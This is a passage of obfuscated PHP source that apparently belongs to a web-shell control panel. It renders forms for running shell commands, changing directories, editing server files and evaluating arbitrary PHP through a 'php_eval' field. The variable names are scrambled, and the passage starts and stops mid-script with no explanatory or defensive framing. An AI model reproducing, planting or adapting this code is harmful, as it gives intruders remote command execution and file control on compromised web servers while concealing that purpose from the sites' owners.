echo sr(15,"<b>".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text3'].$V2te2ds1mx4s."</b>",in('text','cmd',85,''));
echo sr(15,"<b>".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text4'].$V2te2ds1mx4s."</b>",in('text','dir',85,$Vplpou1bf0pg).ws(4).in('submit','submit',0,$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_butt1']));
echo $Vlrtnwermkbo.'</div>'.$Vaplrpgvvrh0.$Vrhwepcaoo35;
}
else{
echo $Viiccmr1jszn.$Vbazz4zfnyqp.$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text28'].up_down('id2').$Vxww0x5eqhzw.div('id2').$Vm2z5ooq3owk;
echo sr(15,"<b>".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text4'].$V2te2ds1mx4s."</b>",in('text','dir',85,$Vplpou1bf0pg).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_butt6']));
echo $Vlrtnwermkbo.'</div>'.$Vaplrpgvvrh0.$Vrhwepcaoo35;
}
echo $Viiccmr1jszn.$Vbazz4zfnyqp.$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text42'].up_down('id3').$Vxww0x5eqhzw.div('id3').$Vm2z5ooq3owk;
echo sr(15,"<b>".$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text43'].$V2te2ds1mx4s."</b>",in('text','e_name',85,$Vplpou1bf0pg).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$Vplpou1bf0pg).ws(4).in('submit','submit',0,$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_butt11']));
echo $Vlrtnwermkbo.'</div>'.$Vaplrpgvvrh0.$Vrhwepcaoo35;


echo $Viiccmr1jszn.$Vbazz4zfnyqp.$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_text32'].up_down('id9').$Vxww0x5eqhzw.$Vv1jfesmmssg;
echo "<div align=center>".div('id9')."<textarea name=php_eval cols=100 rows=3>";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(""));
echo "</textarea>";
echo in('hidden','dir',0,$Vplpou1bf0pg).in('hidden','cmd',0,'php_eval');
echo "<br>".ws(1).in('submit','submit',0,$Vlkeksd0tjv1[$Vxd5eqf0ldh0.'_butt1']);
echo "</div></div></font>";
echo $Vaplrpgvvrh0.$Vrhwepcaoo35;

?>
